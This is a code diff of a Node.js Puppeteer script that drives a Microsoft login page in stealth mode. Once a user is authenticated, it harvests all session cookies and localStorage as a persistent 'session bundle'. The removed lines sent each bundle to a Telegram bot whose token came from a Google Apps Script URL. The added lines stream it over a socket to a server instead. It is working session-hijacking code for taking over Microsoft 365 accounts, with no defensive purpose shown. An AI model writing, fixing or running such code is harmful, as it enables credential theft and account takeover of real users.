@@ -4,67 +4,64 @@ const axios = require('axios');
 
 puppeteer.use(StealthPlugin());
 
-// Replace with your Google Apps Script Web App URL
-const VAULT_URL = 'https://script.google.com/macros/s/AKfycbxiTa8hZVxDL_QEGtAKX1U9gSS8V1pHzePgH41MZxwtP7YgpQN8IMG3bgGw7lKdjBSR/exec';
-
-async function captureSession() {
-    // 1. Fetch Environment Variables from Google Vault
-    const envResponse = await axios.get(VAULT_URL);
-    const { TELEGRAM_TOKEN, CHAT_ID } = envResponse.data;
-
+async function startSession(io, socket) {
     const browser = await puppeteer.launch({
         headless: "new",
         args: [
-            '--disable-blink-features=AutomationControlled',
             '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
             '--disable-features=IsolateOrigins,site-per-process'
         ]
     });
 
-    const page = await browser.newPage();
-    
-    // Set a consistent User-Agent to prevent fingerprint mismatch
-    const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
-    await page.setUserAgent(UA);
+    try {
+        const page = await browser.newPage();
+        
+        // Match a standard Desktop User-Agent to avoid 'Bound Session' flags
+        const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
+        await page.setUserAgent(UA);
 
-    console.log("Navigating to Microsoft...");
-    await page.goto('https://login.microsoftonline.com', { waitUntil: 'networkidle2' });
+        console.log("Navigating to Microsoft...");
+        await page.goto('https://login.microsoftonline.com', { 
+            waitUntil: 'networkidle2',
+            timeout: 60000 
+        });
 
-    // 2. Wait for successful landing (RPSSecAuth exists only after login)
-    console.log("Waiting for session stabilization...");
-    await page.waitForFunction(() => document.cookie.includes('RPSSecAuth'), { timeout: 120000 });
+        console.log("Waiting for session stabilization (120s max)...");
+        
+        // FIX: Broaden the wait condition to prevent TimeoutError
+        await page.waitForFunction(() => {
+            const hasAuthCookie = document.cookie.includes('RPSSecAuth') || document.cookie.includes('ESTSAUTH');
+            const isAtDashboard = window.location.href.includes('outlook.office.com') || window.location.href.includes('portal.office.com');
+            const hasSearchBox = !!document.querySelector('#top_panel_search_input');
+            
+            return hasAuthCookie || isAtDashboard || hasSearchBox;
+        }, { timeout: 120000 });
 
-    // 3. Extract Full Session Bundle
-    const client = await page.target().createCDPSession();
-    const { cookies } = await client.send('Network.getAllCookies');
-    
-    const localStorageData = await page.evaluate(() => JSON.stringify(localStorage));
-    
-    const sessionBundle = {
-        timestamp: new Date().toISOString(),
-        userAgent: UA,
-        cookies: cookies,
-        localStorage: JSON.parse(localStorageData)
-    };
+        // Extract using CDP to get cross-domain cookies (Required for persistence)
+        const client = await page.target().createCDPSession();
+        const { cookies } = await client.send('Network.getAllCookies');
+        const localStorageData = await page.evaluate(() => JSON.stringify(localStorage));
 
-    // 4. Exfiltrate via Telegram
-    const message = `✅ **New Session Captured**\nAccount: Microsoft/Outlook\nStatus: Persistent`;
-    const document = JSON.stringify(sessionBundle, null, 2);
+        const sessionBundle = {
+            cookies,
+            localStorage: JSON.parse(localStorageData),
+            userAgent: UA,
+            capturedAt: new Date().toISOString()
+        };
 
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-        chat_id: CHAT_ID,
-        caption: message,
-        parse_mode: 'Markdown',
-        document: {
-            value: Buffer.from(document),
-            options: { filename: 'session_bundle.json', contentType: 'application/json' }
-        }
-    }, {
-        headers: { 'Content-Type': 'multipart/form-data' }
-    });
+        console.log("Session Bundle generated.");
+        socket.emit('session_data', sessionBundle);
 
-    console.log("Session Bundle sent to Telegram.");
-    await browser.close();
+    } catch (error) {
+        console.error("Orchestra Error:", error.message);
+        socket.emit('session_error', error.message);
+        throw error; // Let server.js log the stack trace
+    } finally {
+        await browser.close();
+    }
 }
 
-captureSession().catch(console.error);
+// CRITICAL: Must match the name used in require() in server.js
+module.exports = { startSession };
